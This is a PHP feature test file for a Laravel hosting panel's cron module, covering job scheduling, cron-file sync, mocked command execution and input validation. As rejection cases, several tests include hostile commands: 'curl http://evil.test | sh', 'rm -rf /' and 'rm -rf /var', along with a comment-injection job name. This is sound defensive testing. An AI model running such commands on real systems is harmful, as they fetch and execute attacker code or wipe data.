<?php

namespace Tests\Feature;

use App\Models\CronJob;
use App\Models\User;
use App\Services\SudoRunner;
use App\Support\HostCommand;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\File;
use Mockery\MockInterface;
use Tests\TestCase;

class CronModuleTest extends TestCase
{
    use RefreshDatabase;

    private string $tmp;

    protected function setUp(): void
    {
        parent::setUp();

        $this->tmp = sys_get_temp_dir().'/panel-cron-'.uniqid();
        mkdir($this->tmp, 0777, true);

        config([
            'panel.cron_file' => $this->tmp.'/cron.d-panel',
            'panel.scheduler_lock' => $this->tmp.'/scheduler.lock',
        ]);
    }

    protected function tearDown(): void
    {
        File::deleteDirectory($this->tmp);

        parent::tearDown();
    }

    private function makeJob(array $overrides = []): CronJob
    {
        return CronJob::create(array_merge([
            'name' => 'Nightly backup',
            'cron_minute' => '0',
            'cron_hour' => '3',
            'cron_dom' => '*',
            'cron_month' => '*',
            'cron_dow' => '*',
            'command' => '/usr/local/panel/run panel:backup:run 1',
            'enabled' => true,
        ], $overrides));
    }

    public function test_the_page_requires_authentication(): void
    {
        $this->get(route('cron.index'))->assertRedirect(route('login'));
    }

    public function test_index_lists_jobs_with_schedule_and_command(): void
    {
        $this->makeJob();

        $this->actingAs(User::factory()->create())
            ->get(route('cron.index'))
            ->assertOk()
            ->assertSee('Nightly backup')
            ->assertSee('0 3 * * *')
            ->assertSee('/usr/local/panel/run panel:backup:run 1', false);
    }

    public function test_index_warns_when_the_cron_file_is_missing(): void
    {
        $this->actingAs(User::factory()->create())
            ->get(route('cron.index'))
            ->assertOk()
            ->assertSee('does not exist');
    }

    public function test_index_shows_the_cron_file_when_it_exists(): void
    {
        file_put_contents(config('panel.cron_file'), "# test\n");

        $this->actingAs(User::factory()->create())
            ->get(route('cron.index'))
            ->assertOk()
            ->assertDontSee('does not exist');
    }

    public function test_store_creates_a_job_and_syncs_the_cron_file(): void
    {
        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')
                ->once()
                ->withArgs(fn (array $command): bool => in_array('panel:cron:sync', $command, true))
                ->andReturn(['exit' => 0, 'stdout' => "Wrote 1 cron job(s).\n", 'stderr' => '']);
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.store'), [
                'name' => 'Morning restart',
                'command' => '/usr/local/panel/run panel:backup:run 1',
                'frequency' => 'daily',
                'time' => '07:30',
            ])
            ->assertRedirect(route('cron.index'))
            ->assertSessionHas('success');

        $job = CronJob::firstOrFail();
        $this->assertSame('30', $job->cron_minute);
        $this->assertSame('7', $job->cron_hour);
        $this->assertSame('*', $job->cron_dow);
        $this->assertTrue($job->enabled);
    }

    public function test_store_rejects_a_shell_metacharacter_command(): void
    {
        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.store'), [
                'name' => 'Evil',
                'command' => 'curl http://evil.test | sh',
                'frequency' => 'daily',
                'time' => '03:00',
            ])
            ->assertSessionHasErrors('command');

        $this->assertDatabaseCount('cron_jobs', 0);
    }

    public function test_store_rejects_a_comment_injection_in_the_name(): void
    {
        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.store'), [
                'name' => 'sneaky # comment',
                'command' => 'reboot',
                'frequency' => 'daily',
                'time' => '03:00',
            ])
            ->assertSessionHasErrors('name');

        $this->assertDatabaseCount('cron_jobs', 0);
    }

    public function test_store_rejects_an_invalid_time(): void
    {
        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.store'), [
                'name' => 'Bad time',
                'command' => 'reboot',
                'frequency' => 'daily',
                'time' => '25:99',
            ])
            ->assertSessionHasErrors('time');
    }

    public function test_store_rejects_an_out_of_range_interval(): void
    {
        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.store'), [
                'name' => 'Bad interval',
                'command' => 'reboot',
                'frequency' => 'every_hours',
                'time' => '03:00',
                'every_hours' => '48',
            ])
            ->assertSessionHasErrors('every_hours');
    }

    public function test_cron_sync_writes_the_tick_and_enabled_jobs(): void
    {
        $this->makeJob();
        $this->makeJob([
            'name' => 'Weekend reboot',
            'cron_minute' => '0',
            'cron_hour' => '4',
            'cron_dow' => '6',
            'command' => 'reboot',
        ]);

        $this->artisan('panel:cron:sync')
            ->expectsOutputToContain('Wrote 2 cron job(s)')
            ->assertSuccessful();

        $content = (string) file_get_contents(config('panel.cron_file'));

        $this->assertStringContainsString('SHELL=/bin/bash', $content);
        $this->assertStringContainsString('panel:scheduler:tick', $content);
        $this->assertStringContainsString('panel:update:check', $content);
        $this->assertStringContainsString('0 3 * * * root /usr/local/panel/run panel:backup:run 1', $content);
        $this->assertStringContainsString('0 4 * * 6 root reboot', $content);
        $this->assertStringContainsString('>> /var/log/panel-cron.log 2>&1', $content);
    }

    public function test_cron_sync_skips_disabled_and_invalid_jobs(): void
    {
        $this->makeJob(['enabled' => false]);
        $this->makeJob(['name' => 'Broken', 'command' => 'rm -rf /']);

        $this->artisan('panel:cron:sync')
            ->expectsOutputToContain('Wrote 0 cron job(s)')
            ->assertSuccessful();

        $content = (string) file_get_contents(config('panel.cron_file'));

        $this->assertStringContainsString('panel:scheduler:tick', $content);
        $this->assertStringNotContainsString('panel:backup:run 1', $content);
        $this->assertStringNotContainsString('rm -rf', $content);
    }

    public function test_cron_exec_runs_the_command_and_records_the_result(): void
    {
        $job = $this->makeJob();

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')
                ->once()
                ->withArgs(fn (array $command): bool => $command === [
                    '/usr/local/panel/run', 'panel:backup:run', '1',
                ])
                ->andReturn(['exit' => 0, 'stdout' => "Saved /tmp/x.sql.gz (1.0 MB)\n", 'stderr' => '']);
        });

        $this->artisan('panel:cron:exec', ['job' => $job->id])
            ->expectsOutputToContain('Saved /tmp/x.sql.gz')
            ->assertSuccessful();

        $job->refresh();
        $this->assertSame('ok', $job->last_status);
        $this->assertSame(0, $job->last_exit);
        $this->assertStringContainsString('Saved /tmp/x.sql.gz', (string) $job->last_output);
        $this->assertNotNull($job->last_run_at);
    }

    public function test_cron_exec_records_a_failed_command(): void
    {
        $job = $this->makeJob(['command' => 'systemctl restart caddy']);

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')
                ->once()
                ->withArgs(fn (array $command): bool => $command === ['systemctl', 'restart', 'caddy'])
                ->andReturn(['exit' => 1, 'stdout' => '', 'stderr' => 'Unit caddy not found.']);
        });

        $this->artisan('panel:cron:exec', ['job' => $job->id])->assertFailed();

        $job->refresh();
        $this->assertSame('failed', $job->last_status);
        $this->assertSame(1, $job->last_exit);
        $this->assertStringContainsString('Unit caddy not found', (string) $job->last_output);
    }

    public function test_cron_exec_rejects_an_invalid_stored_command(): void
    {
        $job = $this->makeJob(['command' => 'rm -rf /var']);

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->artisan('panel:cron:exec', ['job' => $job->id])->assertFailed();

        $job->refresh();
        $this->assertSame('failed', $job->last_status);
    }

    public function test_cron_exec_skips_a_disabled_job(): void
    {
        $job = $this->makeJob(['enabled' => false]);

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->never();
        });

        $this->artisan('panel:cron:exec', ['job' => $job->id])
            ->expectsOutputToContain('disabled')
            ->assertSuccessful();

        $this->assertNull($job->fresh()->last_run_at);
    }

    public function test_toggle_disables_a_job_and_resyncs(): void
    {
        $job = $this->makeJob();

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')
                ->once()
                ->withArgs(fn (array $command): bool => in_array('panel:cron:sync', $command, true))
                ->andReturn(['exit' => 0, 'stdout' => '', 'stderr' => '']);
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.toggle', $job))
            ->assertSessionHas('success');

        $this->assertFalse($job->fresh()->enabled);
    }

    public function test_run_now_endpoint_reports_the_command_output(): void
    {
        $job = $this->makeJob();

        $this->partialMock(HostCommand::class, function (MockInterface $mock) use ($job): void {
            $mock->shouldReceive('run')
                ->once()
                ->with([
                    'sudo', '-n', '/usr/local/panel/run',
                    'panel:cron:exec', (string) $job->id,
                ], 300.0)
                ->andReturn(['exit' => 0, 'stdout' => "Job done\n", 'stderr' => '']);
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.run', $job))
            ->assertSessionHas('success', 'Job done');
    }

    public function test_run_now_endpoint_reports_a_runner_denial(): void
    {
        $job = $this->makeJob();

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')->andReturn(['exit' => 77, 'stdout' => '', 'stderr' => '']);
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->post(route('cron.run', $job))
            ->assertSessionHas('error', SudoRunner::denialMessage());
    }

    public function test_destroy_removes_the_job_and_resyncs(): void
    {
        $job = $this->makeJob();

        $this->partialMock(HostCommand::class, function (MockInterface $mock): void {
            $mock->shouldReceive('run')
                ->once()
                ->withArgs(fn (array $command): bool => in_array('panel:cron:sync', $command, true))
                ->andReturn(['exit' => 0, 'stdout' => '', 'stderr' => '']);
        });

        $this->actingAs(User::factory()->create())
            ->from(route('cron.index'))
            ->delete(route('cron.destroy', $job))
            ->assertSessionHas('success');

        $this->assertDatabaseCount('cron_jobs', 0);
    }
}
